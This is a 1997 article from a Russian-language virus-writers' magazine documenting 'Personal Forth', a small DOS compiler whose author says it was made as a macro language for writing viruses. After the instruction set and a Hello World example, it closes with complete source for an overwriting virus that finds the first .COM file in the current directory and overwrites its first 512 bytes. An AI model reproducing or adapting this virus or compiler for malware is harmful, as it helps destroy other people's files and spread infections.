
      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 176, Kiev 210, Ukraine      IV  1997
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █  █ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █  █ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █  █ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.

----------------------------------------------------------------------------
Personal Forth (C) Light General
Пояснительная документация.
----------------------------------------------------------------------------

o Основные положения :
        - компилируем все процедуры в словарь компилятора
        - после чего начинаем компилировать main() часть
          под смещение 100h
        - при нахождении в исходнике мнемоники ранее скомпилированного слова
          его код переносится в текущую позицию компилируемого кода
          (идея примененная в пакете GraForth)
        - язык чисто машинный ->
          *отсутствуют ветвления и циклы
          *нет переменных

o Зачем это нужно :
        - за счет изменения структуры команд приходим к присутствию
          чистого алгоритма в исходном тексте
        - затрудняется "разборка" алгоритма в отладчиках
        - при введении кода компилятора в результирующую систему
          можно добиться перекомпиляции исходных текстов системы
          с изменением контекста выполняемого кода
        - программист имеющий возможность модифицирования исходных
          текстов данного компилятора может создать язык отвечающий
          только своим запросам

o Как Personal Forth совместим со стандартными Форт системами :
        - поддерживается только идейная совместимость по стеку
          (при пересмотре возможностей стандартного Форт языка
          было решено максимально упростить его идеологию
          т.к. большинство программистов не используют Форт
          в связи с необычностью его структуры)

o Упреждение возражений сторонников Форт стандарта :
        - Personal Forth намерено сделан "слабее" стандартного Форта
          это связано с кругом задач определяемых
          т.н. "прямым исполнением" к примеру BELL ." Hello World!"
          этим задачам не нужна мощь Форт стандарта,но желательно
          их создавать на понятном макро языке
        - по своей структуре данный язык приближен к Ассемблеру
          тому пример широкое использование регистров процессора
        - и вообще я пытался от Форт структур оставить одно название,
          собственно присутствующее в названии Personal Forth :)

o Ограничения :
        - в первой версии компилятора, поле кода скомпилированных процедур
          и собственно целевого кода не может превышать 2048 + 2048 байт
        - количество создаваемых слов < 256

o Особые положения :
        - Personal Forth предназначен для применения исключительно
          на компьютерах с процессорами типа Intel 80x86
        - изначальная идея создания данного языка была вызвана
          желанием иметь макро язык для создания вирусов
          (смотрите примеры)

o Система команд :

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Пояснение(1) : ( 1 2 -- 3 )
 1,2 - состояние данных в стеке до выполнения операции
 3 - после

 1 = [sp-2]  ; ( stackLow stackHigh -- )
 2 = [sp]

Пояснение(2) :
 слова немедленного исполнения
 (которым при компиляции исходника передается управление)
 должны заканчиваться знаком '~' : lit~, wrd~, int~
 их вызов производится командой call [bx]
 при этом SI = смещение следующего слова в исходном тексте
          DI = смещение следующего байта в поле компилируемого кода
 при возврате из такого слова, компилятор использует регистры SI и DI
 так как их изменило вызывавшееся слово (если оно их меняло).

Пояснение(3) :
 w - word
 b - byte

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
---------------------------------------------------------------------------
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
---------------------------------------------------------------------------

 ax< bx< cx< dx< bp< sp< si< di< es< ds<   ( w -- )
 реализовано pop reg  ; снимаем со стека слово в указаный регистр

 ax> bx> cx> dx> bp> sp> si> di> es> ds> cs> ss>  ( -- w )
 реализовано push reg ; значение указанного регистра кладется на стек

 ! ( addr w -- )
 pop ax bx
 mov [bx],ax ; слово w суем в ячейку addr

 @ ( addr -- w )
 pop bx
 push [bx] ; кладем на стек слово из addr

 ret ( w -- )
 ret ; передаем управление на адрес w

 retf ( seg ofs -- )
 retf ; межсегментная передача управления

 zret ( w -- )
 jnz _1
 ret
 _1:   ; возврат по флагу ZF

 nzret
 cret
 ncret ; возврат по NZ,CY,NC

 = ( w1 w2 -- )
 pop ax,bx ; ax=w2,bx=w1
 cmp ax,bx ; сравниваем два верхних слова,в результате устанавливаются флаги

 + ( w1 w2 -- w3 )
 pop ax bx
 add ax,bx
 push ax ; w3 сумма w2+w1

 - ( w1 w2 -- w3 )
 pop ax,bx
 sub ax,bx
 push ax ; w3 разность w2-w1

 drop ( w -- )
 add sp,02 ; сбрасываем с верхушки стека одно слово

 swap ( w1 w2 -- w2 w1 )
 pop ax bx
 push ax bx ; меняем верхние два слова местами

 lit~ ( -- w )
 слово немедленного исполнения :
 при компиляции выбирает следующее за ним слово считая,что это цифровая
 константа!В итоге компилируется :
 call $+3
_1:
 pop bx
 add bx,_2-_1
 push word ptr [bx]
 jmp _3
_2:
 dw CompiledWord
_3:
 десятичное число начинается с 0 - пример 03,32765,65535
 шеснадцатиричное должно занимать четыре символа и заканчиваться буквой 'h'
 (буква маленькая!),A,B,C,D,E,F -- большие буквы!!! пример 06FAh,FFFFh,0001h

 wrd~
 слово немедленного исполнения :
 создает имя слова во внутренней таблице компилятора выбирая его
 из исходного текста

 ewrd~
 слово немедленного исполнения :
 завершает компиляцию текущего слова
 и подготавливает таблицы для компиляции новых слов

 exit~
 слово немедленного исполнения :
 прекращает компиляцию текста и создает на диске целевой .COM файл

 int~
 слово немедленного исполнения :
 вибирает из исходного текста шестнадцатиричный байт
 и формирует в поле текущего кода команду int b
 пример int~ 21h,int~ 13h,int~ 03h

 "~ ( -- w )
 слово немедленного исполнения :
 выбирает из исходника символы и компилирует их в код до первого знака '"'
 в поле кода формируется такой код :
 call $+3
_1:
 pop bx
 add bx,_2-_1
 push bx
 jmp _3
_2:
 db xx dup(CompiledChars)
_3:  ; т.е. при последующем исполнении адрес строки кладется на стек
(нужно заметить,что процедура компиляции символов не различает их ASCII коды
 т.е. можно в редакторе типа внутреннего редактора VC набить строку,а затем
 HEX режиме исправить символы на какие угодно цифры 0-ffh)

 $ ( -- w )
 call $+3 ; кладем на стек текущий исполняемый адрес

 move ( src dest count -- )
 pop cx si di
 rep movsb ; переносим count байтов из src в dst

 make~
 слово немедленного исполнения :
 после него код всех компилируемых слов и мнемоник будет располагаться
 начиная со смещения 100h
 при создании целевого файла код начиная с этого смещения будет записан в 
 файл

 ofs~ ( -- w )
 слово немедленного исполнения :
 выбирается слово из исходного текста и ищется в словаре после чего
 в код компилируется целевой код слова lit~ со значением адреса слова
 имя которого следует за ofs~

 label~
 слово немедленного исполнения :
 выбирается имя из исходного текста и создается слово нулевой длины
 теперь по слову ofs~ можно получить адрес этой а-ля метки

 alloc~
 слово немедленного исполнения :
 выбирает следующий за ним шестнадцатиричный байт и выделяет в коде
 место длиной в значение сего байта.Пример alloc~ FFh,alloc~ 03h
 результирующий код :
 jmp _1  ; 0e9h xx xx
 db xx dup (?)
_1:

 mov~
 слово немедленного исполнения :
 формат : mov~ register,hexvalue ( mov~ ax,0009h  mov~ sp,FFFFh )
 формирует в поле кода команду mov reg,value

 rem~
 слово немедленного исполнения :
 игнорирует все символы до конца строки

---------------------------------------------------------------------------
///////////////////////////////////////////////////////////////////////////
---------------------------------------------------------------------------

Пример(1) : программа декрементируя счетчик пищит два раза,
            а затем выводит на экран строку 'Hello World!'
===========================================================================
 wrd~ BELL mov~ bx,0000h mov~ ax,0E07h int~ 10h ewrd~     rem~ Пищим!
 make~ lit~ 0200h lit~ 02 !
 label~ _1 lit~ 0200h dup @ lit~ 01 swap - ! BELL ofs~ _1
 lit~ 0200h @ lit~ 00 =  nzret drop
 "~ Hello World!$" dx< mov~ ax,0900h int~ 21h int~ 20h exit~
===========================================================================

Пример(2) : тупейший оверврайтный вирус поражающий первый .COM файл
            в текущем пути
            (обратите внимание на строку "~ *.COM "
             символ перед '"' имеет код 0)
===========================================================================
 make~
 rem~ - findfirst *.com file
 "~ *.COM " dx< mov~ cx,003Fh mov~ ax,4E00h int~ 21h
 rem~ - open finded file
 lit~ 030 di> + dx< mov~ ax,3D02h int~ 21h ax> bp<
 rem~ - overwrite first 200h bytes
 mov~ dx,0100h mov~ cx,0200h mov~ ax,4000h bp> bx< int~ 21h
 rem~ - close file
 mov~ ax,3E00h bp> bx< int~ 21h
 rem~ - exit to DOS
 int~ 20h exit~
===========================================================================